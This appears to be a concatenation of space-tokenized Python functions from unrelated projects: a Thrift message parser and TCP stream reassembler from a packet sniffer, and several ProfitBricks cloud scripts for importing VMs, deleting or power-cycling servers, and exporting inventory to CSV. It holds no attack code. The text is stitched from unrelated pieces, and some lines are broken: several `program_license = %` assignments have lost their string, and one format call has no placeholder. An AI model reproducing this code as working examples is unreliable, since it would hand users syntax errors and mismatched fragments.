def read ( cls , data , protocol = None , fallback_protocol = TBinaryProtocol , finagle_thrift = False , max_fields = MAX_FIELDS , max_list_size = MAX_LIST_SIZE , max_map_size = MAX_MAP_SIZE , max_set_size = MAX_SET_SIZE , read_values = False ) : # do we have enough data? if len ( data ) < cls . MIN_MESSAGE_SIZE : raise ValueError ( 'not enough data' ) if protocol is None : protocol = cls . detect_protocol ( data , fallback_protocol ) trans = TTransport . TMemoryBuffer ( data ) proto = protocol ( trans ) # finagle-thrift prepends a RequestHeader # # See: http://git.io/vsziG header = None if finagle_thrift : try : header = ThriftStruct . read ( proto , max_fields , max_list_size , max_map_size , max_set_size , read_values ) except : # reset stream, maybe it's not finagle-thrift trans = TTransport . TMemoryBuffer ( data ) proto = protocol ( trans ) # unpack the message method , mtype , seqid = proto . readMessageBegin ( ) mtype = cls . message_type_to_str ( mtype ) if len ( method ) == 0 or method . isspace ( ) or method . startswith ( ' ' ) : raise ValueError ( 'no method name' ) if len ( method ) > cls . MAX_METHOD_LENGTH : raise ValueError ( 'method name too long' ) # we might have made it until this point by mere chance, so filter out # suspicious method names valid = range ( 33 , 127 ) if any ( ord ( char ) not in valid for char in method ) : raise ValueError ( 'invalid method name' % method ) args = ThriftStruct . read ( proto , max_fields , max_list_size , max_map_size , max_set_size , read_values ) proto . readMessageEnd ( ) # Note: this is a bit fragile, the right thing would be to count bytes # as we read them (i.e.: when calling readI32, etc). msglen = trans . _buffer . tell ( ) return cls ( method , mtype , seqid , args , header , msglen ) , msglen
def pop ( self , nbytes ) : size = 0 popped = [ ] with self . _lock_packets : while size < nbytes : try : packet = self . _packets . pop ( 0 ) size += len ( packet . data . data ) self . _remaining -= len ( packet . data . data ) popped . append ( packet ) except IndexError : break return popped
def pop_data ( self , nbytes ) : last_timestamp = 0 data = [ ] for packet in self . pop ( nbytes ) : last_timestamp = packet . timestamp data . append ( packet . data . data ) return '' . join ( data ) , last_timestamp
def push ( self , ip_packet ) : data_len = len ( ip_packet . data . data ) seq_id = ip_packet . data . seq if data_len == 0 : self . _next_seq_id = seq_id return False # have we seen this packet? if self . _next_seq_id != - 1 and seq_id != self . _next_seq_id : return False self . _next_seq_id = seq_id + data_len with self . _lock_packets : # Note: we only account for payload (i.e.: tcp data) self . _length += len ( ip_packet . data . data ) self . _remaining += len ( ip_packet . data . data ) self . _packets . append ( ip_packet ) return True
def run ( self , * args , * * kwargs ) : while True : try : timestamp , ip_p = self . _queue . popleft ( ) src_ip = get_ip ( ip_p , ip_p . src ) dst_ip = get_ip ( ip_p , ip_p . dst ) src = intern ( '%s:%s' % ( src_ip , ip_p . data . sport ) ) dst = intern ( '%s:%s' % ( dst_ip , ip_p . data . dport ) ) key = intern ( '%s<->%s' % ( src , dst ) ) stream = self . _streams . get ( key ) if stream is None : stream = Stream ( src , dst ) self . _streams [ key ] = stream # HACK: save the timestamp setattr ( ip_p , 'timestamp' , timestamp ) pushed = stream . push ( ip_p ) if not pushed : continue # let listeners know about the updated stream for handler in self . _handlers : try : handler ( stream ) except Exception as ex : print ( 'handler exception: %s' % ex ) except Exception : time . sleep ( 0.00001 )
def main ( argv = None ) : if argv is None : argv = sys . argv else : sys . argv . extend ( argv ) program_name = os . path . basename ( sys . argv [ 0 ] ) program_version = "v%s" % __version__ program_build_date = str ( __updated__ ) program_version_message = '%%(prog)s %s (%s)' % ( program_version , program_build_date ) program_shortdesc = __import__ ( '__main__' ) . __doc__ . split ( "\n" ) [ 1 ] program_license = % ( program_shortdesc , str ( __date__ ) ) try : # Setup argument parser parser = ArgumentParser ( description = program_license , formatter_class = RawDescriptionHelpFormatter ) parser . add_argument ( '-u' , '--user' , dest = 'user' , help = 'the login name' ) parser . add_argument ( '-p' , '--password' , dest = 'password' , help = 'the login password' ) parser . add_argument ( '-L' , '--Login' , dest = 'loginfile' , default = None , help = 'the login file to use' ) parser . add_argument ( '-t' , '--type' , dest = 'metatype' , default = "OVF" , help = 'type of VM meta data' ) parser . add_argument ( '-m' , '--metadata' , dest = 'metafile' , required = True , default = None , help = 'meta data file' ) parser . add_argument ( '-d' , '--datacenterid' , dest = 'datacenterid' , default = None , help = 'datacenter of the new server' ) parser . add_argument ( '-D' , '--DCname' , dest = 'dcname' , default = None , help = 'new datacenter name' ) parser . add_argument ( '-l' , '--location' , dest = 'location' , default = None , help = 'location for new datacenter' ) parser . add_argument ( '-v' , '--verbose' , dest = "verbose" , action = "count" , default = 0 , help = "set verbosity level [default: %(default)s]" ) parser . add_argument ( '-V' , '--version' , action = 'version' , version = program_version_message ) # Process arguments args = parser . parse_args ( ) global verbose verbose = args . verbose if verbose > 0 : print ( "Verbose mode on" ) print ( "start {} with args {}" . format ( program_name , str ( args ) ) ) ( user , password ) = getLogin ( args . loginfile , args . user , args . password ) if user is None or password is None : raise ValueError ( "user or password resolved to None" ) pbclient = ProfitBricksService ( user , password ) if args . metatype == 'OVF' : metadata = OFVData ( args . metafile ) metadata . parse ( ) else : sys . stderr . write ( "Metadata type '{}' is not supported" . format ( args . metatype ) ) return 1 # we need the DC first to have the location defined dc_id = None if args . datacenterid is None : if args . dcname is None or args . location is None : sys . stderr . write ( "Either '-d <id>' or '-D <name> -l <loc>'  must be specified" ) return 1 # else: we will create the DC later after parsing the meta data else : dc_id = args . datacenterid if dc_id is None : location = args . location dc = Datacenter ( name = args . dcname , location = location , description = "created by pb_importVM" ) print ( "create new DC {}" . format ( str ( dc ) ) ) response = pbclient . create_datacenter ( dc ) dc_id = response [ 'id' ] result = wait_for_request ( pbclient , response [ 'requestId' ] ) print ( "wait loop returned {}" . format ( result ) ) else : dc = pbclient . get_datacenter ( dc_id ) location = dc [ 'properties' ] [ 'location' ] print ( "use existing DC {} in location {}" . format ( dc [ 'properties' ] [ 'name' ] , location ) ) # check if images exist for disk in metadata . disks : disk_name = disk [ 'file' ] images = get_disk_image_by_name ( pbclient , location , disk_name ) if not images : raise ValueError ( "No HDD image with name '{}' found in location {}" . format ( disk_name , location ) ) if len ( images ) > 1 : raise ValueError ( "Ambigous image name '{}' in location {}" . format ( disk_name , location ) ) disk [ 'image' ] = images [ 0 ] [ 'id' ] # now we're ready to create the VM # Server server = Server ( name = metadata . name , cores = metadata . cpus , ram = metadata . ram ) print ( "create server {}" . format ( str ( Server ) ) ) response = pbclient . create_server ( dc_id , server ) srv_id = response [ 'id' ] result = wait_for_request ( pbclient , response [ 'requestId' ] ) print ( "wait loop returned {}" . format ( str ( result ) ) ) # NICs (note that createing LANs may be implicit) for nic in metadata . nics : dcnic = NIC ( name = nic [ 'nic' ] , lan = nic [ 'lanid' ] ) print ( "create NIC {}" . format ( str ( dcnic ) ) ) response = pbclient . create_nic ( dc_id , srv_id , dcnic ) nic_id = response [ 'id' ] result = wait_for_request ( pbclient , response [ 'requestId' ] ) print ( "wait loop returned {}" . format ( str ( result ) ) ) response = pbclient . get_nic ( dc_id , srv_id , nic_id , 2 ) mac = response [ 'properties' ] [ 'mac' ] print ( "dcnic has MAC {} for {}" . format ( mac , nic_id ) ) # end for(nics) # Volumes (we use the image name as volume name too requests = [ ] for disk in metadata . disks : dcvol = Volume ( name = disk [ 'file' ] , size = disk [ 'capacity' ] , image = disk [ 'image' ] , licence_type = metadata . licenseType ) print ( "create Volume {}" . format ( str ( dcvol ) ) ) response = pbclient . create_volume ( dc_id , dcvol ) requests . append ( response [ 'requestId' ] ) disk [ 'volume_id' ] = response [ 'id' ] # end for(disks) if requests : result = wait_for_requests ( pbclient , requests , initial_wait = 10 , scaleup = 15 ) print ( "wait loop returned {}" . format ( str ( result ) ) ) for disk in metadata . disks : print ( "attach volume {}" . format ( disk ) ) response = pbclient . attach_volume ( dc_id , srv_id , disk [ 'volume_id' ] ) result = wait_for_request ( pbclient , response [ 'requestId' ] ) print ( "wait loop returned {}" . format ( str ( result ) ) ) # end for(disks) print ( "import of VM succesfully finished" ) return 0 except KeyboardInterrupt : # handle keyboard interrupt return 0 except Exception : traceback . print_exc ( ) sys . stderr . write ( "\n" + program_name + ":  for help use --help\n" ) return 2
def _read_config ( self , filename = None ) : if filename : self . _config_filename = filename else : try : import appdirs except ImportError : raise Exception ( "Missing dependency for determining config path. Please install " "the 'appdirs' Python module." ) self . _config_filename = appdirs . user_config_dir ( _LIBRARY_NAME , "ProfitBricks" ) + ".ini" if not self . _config : self . _config = configparser . ConfigParser ( ) self . _config . optionxform = str self . _config . read ( self . _config_filename )
def _save_config ( self , filename = None ) : if filename is None : filename = self . _config_filename parent_path = os . path . dirname ( filename ) if not os . path . isdir ( parent_path ) : os . makedirs ( parent_path ) with open ( filename , "w" ) as configfile : self . _config . write ( configfile )
def create_datacenter ( self , datacenter ) : server_items = [ ] volume_items = [ ] lan_items = [ ] loadbalancer_items = [ ] entities = dict ( ) properties = { "name" : datacenter . name } # Omit 'location', if not provided, to receive # a meaningful error message. if datacenter . location : properties [ 'location' ] = datacenter . location # Optional Properties if datacenter . description : properties [ 'description' ] = datacenter . description # Servers if datacenter . servers : for server in datacenter . servers : server_items . append ( self . _create_server_dict ( server ) ) servers = { "items" : server_items } server_entities = { "servers" : servers } entities . update ( server_entities ) # Volumes if datacenter . volumes : for volume in datacenter . volumes : volume_items . append ( self . _create_volume_dict ( volume ) ) volumes = { "items" : volume_items } volume_entities = { "volumes" : volumes } entities . update ( volume_entities ) # Load Balancers if datacenter . loadbalancers : for loadbalancer in datacenter . loadbalancers : loadbalancer_items . append ( self . _create_loadbalancer_dict ( loadbalancer ) ) loadbalancers = { "items" : loadbalancer_items } loadbalancer_entities = { "loadbalancers" : loadbalancers } entities . update ( loadbalancer_entities ) # LANs if datacenter . lans : for lan in datacenter . lans : lan_items . append ( self . _create_lan_dict ( lan ) ) lans = { "items" : lan_items } lan_entities = { "lans" : lans } entities . update ( lan_entities ) if not entities : raw = { "properties" : properties , } else : raw = { "properties" : properties , "entities" : entities } data = json . dumps ( raw ) response = self . _perform_request ( url = '/datacenters' , method = 'POST' , data = data ) return response
def update_image ( self , image_id , * * kwargs ) : data = { } for attr , value in kwargs . items ( ) : data [ self . _underscore_to_camelcase ( attr ) ] = value response = self . _perform_request ( url = '/images/' + image_id , method = 'PATCH' , data = json . dumps ( data ) ) return response
def reserve_ipblock ( self , ipblock ) : properties = { "name" : ipblock . name } if ipblock . location : properties [ 'location' ] = ipblock . location if ipblock . size : properties [ 'size' ] = str ( ipblock . size ) raw = { "properties" : properties , } response = self . _perform_request ( url = '/ipblocks' , method = 'POST' , data = json . dumps ( raw ) ) return response
def _underscore_to_camelcase ( value ) : def camelcase ( ) : yield str . lower while True : yield str . capitalize c = camelcase ( ) return "" . join ( next ( c ) ( x ) if x else '_' for x in value . split ( "_" ) )
def getServerInfo ( pbclient = None , dc_id = None ) : if pbclient is None : raise ValueError ( "argument 'pbclient' must not be None" ) if dc_id is None : raise ValueError ( "argument 'dc_id' must not be None" ) # list of all found server's info server_info = [ ] # depth 1 is enough for props/meta servers = pbclient . list_servers ( dc_id , 1 ) for server in servers [ 'items' ] : props = server [ 'properties' ] info = dict ( id = server [ 'id' ] , name = props [ 'name' ] , state = server [ 'metadata' ] [ 'state' ] , vmstate = props [ 'vmState' ] ) server_info . append ( info ) # end for(servers) return server_info
def getServerStates ( pbclient = None , dc_id = None , serverid = None , servername = None ) : if pbclient is None : raise ValueError ( "argument 'pbclient' must not be None" ) if dc_id is None : raise ValueError ( "argument 'dc_id' must not be None" ) server = None if serverid is None : if servername is None : raise ValueError ( "one of 'serverid' or 'servername' must be specified" ) # so, arg.servername is set (to whatever) server_info = select_where ( getServerInfo ( pbclient , dc_id ) , [ 'id' , 'name' , 'state' , 'vmstate' ] , name = servername ) if len ( server_info ) > 1 : raise NameError ( "ambiguous server name '{}'" . format ( servername ) ) if len ( server_info ) == 1 : server = server_info [ 0 ] else : # get by ID may also fail if it's removed # in this case, catch exception (message 404) and be quiet for a while # unfortunately this has changed from Py2 to Py3 try : server_info = pbclient . get_server ( dc_id , serverid , 1 ) server = dict ( id = server_info [ 'id' ] , name = server_info [ 'properties' ] [ 'name' ] , state = server_info [ 'metadata' ] [ 'state' ] , vmstate = server_info [ 'properties' ] [ 'vmState' ] ) except Exception : ex = sys . exc_info ( ) [ 1 ] if ex . args [ 0 ] is not None and ex . args [ 0 ] == 404 : print ( "Server w/ ID {} not found" . format ( serverid ) ) server = None else : raise ex # end try/except # end if/else(serverid) return server
def main ( argv = None ) : if argv is None : argv = sys . argv else : sys . argv . extend ( argv ) program_name = os . path . basename ( sys . argv [ 0 ] ) program_version = "v%s" % __version__ program_build_date = str ( __updated__ ) program_version_message = '%%(prog)s %s (%s)' % ( program_version , program_build_date ) program_shortdesc = __import__ ( '__main__' ) . __doc__ . split ( "\n" ) [ 1 ] program_license = % ( program_shortdesc , str ( __date__ ) ) try : # Setup argument parser parser = ArgumentParser ( description = program_license , formatter_class = RawDescriptionHelpFormatter ) parser . add_argument ( '-u' , '--user' , dest = 'user' , help = 'the login name' ) parser . add_argument ( '-p' , '--password' , dest = 'password' , help = 'the login password' ) parser . add_argument ( '-L' , '--Login' , dest = 'loginfile' , default = None , help = 'the login file to use' ) parser . add_argument ( '-d' , '--datacenterid' , dest = 'dc_id' , required = True , default = None , help = 'datacenter of the server' ) parser . add_argument ( '-s' , '--serverid' , dest = 'serverid' , default = None , help = 'ID of the server' ) parser . add_argument ( '-n' , '--name' , dest = 'servername' , default = None , help = 'name of the server' ) parser . add_argument ( '-C' , '--command' , dest = 'command' , default = None , help = 'remote shell command to use for shutdown' ) parser . add_argument ( '-v' , '--verbose' , dest = "verbose" , action = "count" , help = "set verbosity level [default: %(default)s]" ) parser . add_argument ( '-V' , '--version' , action = 'version' , version = program_version_message ) # Process arguments args = parser . parse_args ( ) global verbose verbose = args . verbose dc_id = args . dc_id if verbose > 0 : print ( "Verbose mode on" ) if args . serverid is None and args . servername is None : parser . error ( "one of 'serverid' or 'name' must be specified" ) ( user , password ) = getLogin ( args . loginfile , args . user , args . password ) if user is None or password is None : raise ValueError ( "user or password resolved to None" ) pbclient = ProfitBricksService ( user , password ) server = getServerStates ( pbclient , dc_id , args . serverid , args . servername ) if server is None : raise Exception ( 1 , "specified server not found" ) print ( "using server {}(id={}) in state {}, {}" . format ( server [ 'name' ] , server [ 'id' ] , server [ 'state' ] , server [ 'vmstate' ] ) ) # ! stop/start/reboot_server() simply return 'True' ! # this implies, that there's NO response nor requestId to track! if server [ 'vmstate' ] == 'SHUTOFF' : print ( "VM is already shut off" ) else : if args . command is None : print ( "no command specified for shutdown of VM" ) else : print ( "executing {}" . format ( args . command ) ) cmdrc = call ( args . command , shell = True ) print ( "executing {} returned {}" . format ( args . command , cmdrc ) ) server = wait_for_server ( pbclient , dc_id , server [ 'id' ] , indicator = 'vmstate' , state = 'SHUTOFF' , timeout = 300 ) # first we have to delete all attached volumes volumes = pbclient . get_attached_volumes ( dc_id , server [ 'id' ] , 0 ) for vol in volumes [ 'items' ] : print ( "deleting volume {} of server {}" . format ( vol [ 'id' ] , server [ 'name' ] ) ) pbclient . delete_volume ( dc_id , vol [ 'id' ] ) pbclient . delete_server ( dc_id , server [ 'id' ] ) wait_for_datacenter ( pbclient , dc_id ) except KeyboardInterrupt : # handle keyboard interrupt # pass except Exception : traceback . print_exc ( ) sys . stderr . write ( "\n" + program_name + ":  for help use --help\n" ) return 2 return 0
def main ( argv = None ) : if argv is None : argv = sys . argv else : sys . argv . extend ( argv ) program_name = os . path . basename ( sys . argv [ 0 ] ) program_version = "v%s" % __version__ program_build_date = str ( __updated__ ) program_version_message = '%%(prog)s %s (%s)' % ( program_version , program_build_date ) program_shortdesc = __import__ ( '__main__' ) . __doc__ . split ( "\n" ) [ 1 ] program_license = % ( program_shortdesc , str ( __date__ ) ) try : # Setup argument parser parser = ArgumentParser ( description = program_license , formatter_class = RawDescriptionHelpFormatter ) parser . add_argument ( '-u' , '--user' , dest = 'user' , help = 'the login name' ) parser . add_argument ( '-p' , '--password' , dest = 'password' , help = 'the login password' ) parser . add_argument ( '-L' , '--Login' , dest = 'loginfile' , default = None , help = 'the login file to use' ) parser . add_argument ( '-d' , '--datacenterid' , dest = 'dc_id' , required = True , default = None , help = 'datacenter of the server' ) parser . add_argument ( '-s' , '--serverid' , dest = 'serverid' , default = None , help = 'ID of the server' ) parser . add_argument ( '-n' , '--name' , dest = 'servername' , default = None , help = 'name of the server' ) parser . add_argument ( '-a' , '--action' , dest = 'action' , default = None , required = True , help = 'what to do with the server' ) parser . add_argument ( '-C' , '--command' , dest = 'command' , default = None , help = 'remote shell command to use for shutdown' ) parser . add_argument ( '-v' , '--verbose' , dest = "verbose" , action = "count" , help = "set verbosity level [default: %(default)s]" ) parser . add_argument ( '-V' , '--version' , action = 'version' , version = program_version_message ) # Process arguments args = parser . parse_args ( ) global verbose verbose = args . verbose dc_id = args . dc_id if verbose > 0 : print ( "Verbose mode on" ) # normalize action action = args . action . upper ( ) actions = set ( [ 'POWERON' , 'POWEROFF' , 'START' , 'SHUTOFF' ] ) if action not in actions : parser . error ( "action must be on of {}" . format ( str ( actions ) ) ) if args . serverid is None and args . servername is None : parser . error ( "one of 'serverid' or 'name' must be specified" ) ( user , password ) = getLogin ( args . loginfile , args . user , args . password ) if user is None or password is None : raise ValueError ( "user or password resolved to None" ) pbclient = ProfitBricksService ( user , password ) server = getServerStates ( pbclient , dc_id , args . serverid , args . servername ) if server is None : raise Exception ( 1 , "specified server not found" ) print ( "using server {}(id={}) in state {}, {}" . format ( server [ 'name' ] , server [ 'id' ] , server [ 'state' ] , server [ 'vmstate' ] ) ) # !!! stop/start/reboot_server() simply return 'True' !!! # this implies, that there's NO response nor requestId to track! if action == 'POWEROFF' : if server [ 'state' ] == 'INACTIVE' : print ( "server is already powered off" ) else : # currently use 'forced' poweroff if server [ 'vmstate' ] != 'SHUTOFF' : print ( "VM is in state {}, {} may lead to inconsistent state" . format ( server [ 'vmstate' ] , action ) ) if args . command is None : print ( "no command specified for shutdown of VM" ) else : print ( "executing {}" . format ( args . command ) ) cmdrc = call ( args . command , shell = True ) print ( "executing {} returned {}" . format ( args . command , cmdrc ) ) pbclient . stop_server ( dc_id , server [ 'id' ] ) server = wait_for_server ( pbclient , dc_id , server [ 'id' ] , state = 'INACTIVE' , timeout = 300 ) elif action == 'POWERON' : if server [ 'vmstate' ] == 'RUNNING' : print ( "VM is already up and running" ) else : pbclient . start_server ( dc_id , server [ 'id' ] ) server = wait_for_server ( pbclient , dc_id , server [ 'id' ] , indicator = 'vmstate' , state = 'RUNNING' , timeout = 300 ) elif action == 'START' : # this is the same as POWERON if server [ 'vmstate' ] == 'RUNNING' : print ( "VM is already up and running" ) else : pbclient . start_server ( dc_id , server [ 'id' ] ) server = wait_for_server ( pbclient , dc_id , server [ 'id' ] , indicator = 'vmstate' , state = 'RUNNING' , timeout = 300 ) elif action == 'SHUTOFF' : if server [ 'vmstate' ] == 'SHUTOFF' : print ( "VM is already shut off" ) else : if args . command is None : print ( "no command specified for shutdown of VM" ) else : print ( "executing {}" . format ( args . command ) ) cmdrc = call ( args . command , shell = True ) print ( "executing {} returned {}" . format ( args . command , cmdrc ) ) server = wait_for_server ( pbclient , dc_id , server [ 'id' ] , indicator = 'vmstate' , state = 'SHUTOFF' , timeout = 300 ) # end if/else(action) print ( "server {}(id={}) now in state {}, {}" . format ( server [ 'name' ] , server [ 'id' ] , server [ 'state' ] , server [ 'vmstate' ] ) ) except KeyboardInterrupt : # handle keyboard interrupt # pass except Exception : traceback . print_exc ( ) sys . stderr . write ( "\n" + program_name + ":  for help use --help\n" ) return 2 return 0
def get_dc_inventory ( pbclient , dc = None ) : if pbclient is None : raise ValueError ( "argument 'pbclient' must not be None" ) if dc is None : raise ValueError ( "argument 'dc' must not be None" ) dc_inv = [ ] # inventory list to return dcid = dc [ 'id' ] # dc_data contains dc specific columns dc_data = [ dcid , dc [ 'properties' ] [ 'name' ] , dc [ 'properties' ] [ 'location' ] ] # first get the servers # this will build a hash to relate volumes to servers later # depth 3 is enough to get into volume/nic level plus details servers = pbclient . list_servers ( dcid , 3 ) print ( "found %i servers in data center %s" % ( len ( servers [ 'items' ] ) , dc [ 'properties' ] [ 'name' ] ) ) if verbose > 2 : print ( str ( servers ) ) # this will build a hash to relate volumes to servers later bound_vols = dict ( ) # hash volume-to-server relations for server in servers [ 'items' ] : if verbose > 2 : print ( "SERVER: %s" % str ( server ) ) serverid = server [ 'id' ] # server_data contains server specific columns for later output server_data = [ server [ 'type' ] , serverid , server [ 'properties' ] [ 'name' ] , server [ 'metadata' ] [ 'state' ] ] # OS is determined by boot device (volume||cdrom), not a server property. # Might even be unspecified bootOS = "NONE" bootdev = server [ 'properties' ] [ 'bootVolume' ] if bootdev is None : bootdev = server [ 'properties' ] [ 'bootCdrom' ] print ( "server %s has boot device %s" % ( serverid , "CDROM" ) ) if bootdev is None : print ( "server %s has NO boot device" % ( serverid ) ) else : bootOS = bootdev [ 'properties' ] [ 'licenceType' ] server_data += [ bootOS , server [ 'properties' ] [ 'cores' ] , server [ 'properties' ] [ 'ram' ] ] server_vols = server [ 'entities' ] [ 'volumes' ] [ 'items' ] n_volumes = len ( server_vols ) total_disk = 0 licence_type = "" for vol in server_vols : total_disk += vol [ 'properties' ] [ 'size' ] licence_type = str ( vol [ 'properties' ] [ 'licenceType' ] ) bound_vols [ vol [ 'id' ] ] = serverid if verbose : print ( "volume %s is connected to %s w/ OS %s" % ( vol [ 'id' ] , bound_vols [ vol [ 'id' ] ] , licence_type ) ) server_nics = server [ 'entities' ] [ 'nics' ] [ 'items' ] n_nics = len ( server_nics ) server_data += [ n_nics , n_volumes , total_disk , "" , server [ 'metadata' ] [ 'createdDate' ] , server [ 'metadata' ] [ 'lastModifiedDate' ] ] dc_inv . append ( dc_data + server_data ) # end for(servers) # and now the volumes... volumes = pbclient . list_volumes ( dcid , 2 ) # depth 2 gives max. details for volume in volumes [ 'items' ] : if verbose > 2 : print ( "VOLUME: %s" % str ( volume ) ) volid = volume [ 'id' ] vol_data = [ volume [ 'type' ] , volid , volume [ 'properties' ] [ 'name' ] , volume [ 'metadata' ] [ 'state' ] , volume [ 'properties' ] [ 'licenceType' ] , "" , "" , "" , "" , volume [ 'properties' ] [ 'size' ] ] connect = 'NONE' if volid in bound_vols : connect = bound_vols [ volid ] vol_data += [ connect , volume [ 'metadata' ] [ 'createdDate' ] , volume [ 'metadata' ] [ 'lastModifiedDate' ] ] dc_inv . append ( dc_data + vol_data ) # end for(volumes) return dc_inv
def get_dc_network ( pbclient , dc = None ) : if pbclient is None : raise ValueError ( "argument 'pbclient' must not be None" ) if dc is None : raise ValueError ( "argument 'dc' must not be None" ) print ( "getting networks.." ) dcid = dc [ 'id' ] # dc_data contains dc specific columns dc_data = [ dcid , dc [ 'properties' ] [ 'name' ] , dc [ 'properties' ] [ 'location' ] ] lbs = pbclient . list_loadbalancers ( dcid , 2 ) # build lookup hash for loadbalancer's ID->name lbnames = dict ( [ ( lb [ 'id' ] , lb [ 'properties' ] [ 'name' ] ) for lb in lbs [ 'items' ] ] ) if verbose > 2 : print ( "LBs: %s" % ( str ( lbs ) ) ) lans = pbclient . list_lans ( dcid , 3 ) lan_inv = [ ] # lookup hash for server's ID->name servernames = dict ( ) for lan in lans [ 'items' ] : if verbose > 1 : print ( "LAN: %s" % str ( lan ) ) lan_data = dc_data + [ "LAN " + lan [ 'id' ] , lan [ 'properties' ] [ 'name' ] , lan [ 'properties' ] [ 'public' ] , lan [ 'metadata' ] [ 'state' ] ] nics = lan [ 'entities' ] [ 'nics' ] [ 'items' ] lan_data . append ( len ( nics ) ) if nics : for nic in nics : nic_props = nic [ 'properties' ] # get the serverid of this nic by href # !!! HUUUUH this might also be a loadbalancer ID, # although it's '/servers/<id>/...' !!! serverid = re . sub ( r'^.*servers/([^/]+)/nics.*' , r'\1' , nic [ 'href' ] ) if serverid in lbnames : servertype = "LB" servername = lbnames [ serverid ] print ( "server entry for %s is LOADBALANCER %s" % ( serverid , servername ) ) else : servertype = "Server" if serverid not in servernames : if verbose : print ( "add server entry for %s" % serverid ) server = pbclient . get_server ( dcid , serverid , 0 ) servernames [ serverid ] = server [ 'properties' ] [ 'name' ] servername = servernames [ serverid ] # end if/else(serverid) ips = [ str ( ip ) for ip in nic_props [ 'ips' ] ] nic_data = [ nic [ 'id' ] , nic_props [ 'mac' ] , nic_props [ 'dhcp' ] , ips , nic_props [ 'name' ] , nic_props [ 'firewallActive' ] , servertype , serverid , servername ] lan_inv . append ( lan_data + nic_data ) # end for(nics) else : lan_inv . append ( lan_data ) # end for(lans) return lan_inv
def main ( argv = None ) : # IGNORE:C0111 if argv is None : argv = sys . argv else : sys . argv . extend ( argv ) program_name = os . path . basename ( sys . argv [ 0 ] ) program_version = "v%s" % __version__ program_build_date = str ( __updated__ ) program_version_message = '%%(prog)s %s (%s)' % ( program_version , program_build_date ) program_shortdesc = __import__ ( '__main__' ) . __doc__ . split ( "\n" ) [ 1 ] program_license = % ( program_shortdesc , str ( __date__ ) ) try : # Setup argument parser parser = ArgumentParser ( description = program_license , formatter_class = RawDescriptionHelpFormatter ) parser . add_argument ( '-u' , '--user' , dest = 'user' , required = True , help = 'the login name' ) parser . add_argument ( '-p' , '--password' , dest = 'password' , help = 'the login password' ) parser . add_argument ( '-d' , '--datacenter' , '--datacenterid' , dest = 'datacenterid' , nargs = '?' , const = '*' , help = 'show server/storage of datacenter(s)' ) parser . add_argument ( '-i' , '--image' , dest = 'show_images' , action = "store_true" , help = 'show images and snapshots' ) parser . add_argument ( '-b' , '--ipblock' , dest = 'show_ipblocks' , action = "store_true" , help = 'show reserved IP blocks' ) parser . add_argument ( '-n' , '--network' , dest = 'show_networks' , action = "store_true" , help = 'show network assignments' ) #        parser.add_argument( #            '-r', '--request', dest='show_requests', action="store_true", #            help='show requests') parser . add_argument ( "-v" , "--verbose" , dest = "verbose" , action = "count" , default = 0 , help = "set verbosity level [default: %(default)s]" ) parser . add_argument ( '-V' , '--version' , action = 'version' , version = program_version_message ) # Process arguments args = parser . parse_args ( ) global verbose verbose = args . verbose # this is a global to be used in methods user = args . user password = args . password datacenterid = args . datacenterid print ( "Welcome to PB-API %s\n" % user ) if password is None : password = getpass ( ) if verbose > 0 : print ( "Verbose mode on" ) print ( "using python " , sys . version_info ) pbclient = ProfitBricksService ( user , password ) if datacenterid is not None : datacenters = { } if datacenterid == '*' : # the default depth=1 is sufficient, higher values don't provide more details datacenters = pbclient . list_datacenters ( ) else : datacenters [ 'items' ] = [ ] datacenters [ 'items' ] = [ pbclient . get_datacenter ( datacenterid , 1 ) ] if verbose > 1 : print ( pp ( datacenters ) ) print ( "retrieved %i datacenters " % len ( datacenters [ 'items' ] ) ) # dump inventory to file with open ( "pb_datacenter_inventory.csv" , 'w' ) as csvfile : csvwriter = csv . writer ( csvfile , delimiter = ';' , lineterminator = '\n' ) csvwriter . writerow ( [ 'DCID' , 'DCName' , 'Loc' , 'RscType' , 'RscID' , 'RscName' , 'State' , 'LicType' , 'Cores' , 'RAM' , '# NICs' , '# Volumes' , '(Total) Storage' , 'Connected to' , 'Created' , 'Modified' ] ) for dc in datacenters [ 'items' ] : try : dc_inv = get_dc_inventory ( pbclient , dc ) if verbose : print ( "DC %s has %i inventory entries" % ( dc [ 'id' ] , len ( dc_inv ) ) ) for row in dc_inv : csvwriter . writerow ( row ) except Exception : traceback . print_exc ( ) exit ( 2 ) # end for(datacenters) if args . show_images : with open ( "pb_datacenter_images.csv" , 'w' ) as csvfile : csvwriter = csv . writer ( csvfile , delimiter = ';' , lineterminator = '\n' ) csvwriter . writerow ( [ 'Visibility' , 'Loc' , 'RscType' , 'SubType' , 'RscID' , 'RscName' , 'State' , 'LicType' , 'Size' , 'Created' , 'Modified' ] ) img_inv = get_images ( pbclient ) for row in img_inv : csvwriter . writerow ( row ) snap_inv = get_snapshots ( pbclient ) for row in snap_inv : csvwriter . writerow ( row ) if args . show_ipblocks : with open ( "pb_datacenter_ipblocks.csv" , 'w' ) as csvfile : csvwriter = csv . writer ( csvfile , delimiter = ';' , lineterminator = '\n' ) csvwriter . writerow ( [ 'Loc' , 'RscType' , 'RscID' , 'State' , 'Size' , 'IP addresses' ] ) ipblocks = get_ipblocks ( pbclient ) for row in ipblocks : csvwriter . writerow ( row ) # file is automatically closed after with block if args . show_networks : # the default depth=1 is sufficient, higher values don't provide more details datacenters = pbclient . list_datacenters ( ) print ( "retrieved %i datacenters " % len ( datacenters [ 'items' ] ) ) with open ( "pb_datacenter_networks.csv" , 'w' ) as csvfile : csvwriter = csv . writer ( csvfile , delimiter = ';' , lineterminator = '\n' ) csvwriter . writerow ( [ 'DCID' , 'DCName' , 'Loc' , 'LAN ID' , 'LAN name' , 'public' , 'State' , '# NICs' , 'NIC ID' , 'MAC address' , 'DHCP' , 'IP(s)' , 'NIC name' , 'Firewall' , 'Connected to' , 'ID' , 'Name' ] ) for dc in datacenters [ 'items' ] : try : dc_net = get_dc_network ( pbclient , dc ) if verbose : print ( "DC %s has %i network entries" % ( dc [ 'id' ] , len ( dc_net ) ) ) for row in dc_net : csvwriter . writerow ( row ) except Exception : traceback . print_exc ( ) exit ( 2 ) # end for(datacenters) # just for fun: #         if args.show_requests: #             get_requests(pbclient) print ( "%s finished w/o errors" % program_name ) return 0 except KeyboardInterrupt : # handle keyboard interrupt return 0 except Exception : traceback . print_exc ( ) sys . stderr . write ( "\n" + program_name + ":  for help use --help\n" ) return 2
